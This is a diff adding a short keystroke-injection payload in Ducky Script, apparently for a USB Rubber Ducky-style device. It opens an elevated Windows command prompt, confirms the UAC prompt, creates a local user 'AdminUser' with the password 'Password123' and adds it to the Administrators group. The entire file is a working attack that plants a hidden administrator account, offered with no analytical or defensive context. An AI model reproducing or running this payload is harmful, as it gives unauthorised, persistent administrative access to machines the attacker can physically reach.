@@ -1,0 +1,25 @@
+DELAY 1000
+REM Opens the command prompt with admin privileges
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+REM Bypasses UAC
+ALT y
+DELAY 1000
+
+REM Creates a new user called AdminUser with password Password123
+STRING net user AdminUser Password123 /add
+ENTER
+DELAY 500
+
+REM Adds the new user to the Administrators group
+STRING net localgroup Administrators AdminUser /add
+ENTER
+DELAY 500
+
+REM Exits the command prompt
+STRING exit
+ENTER
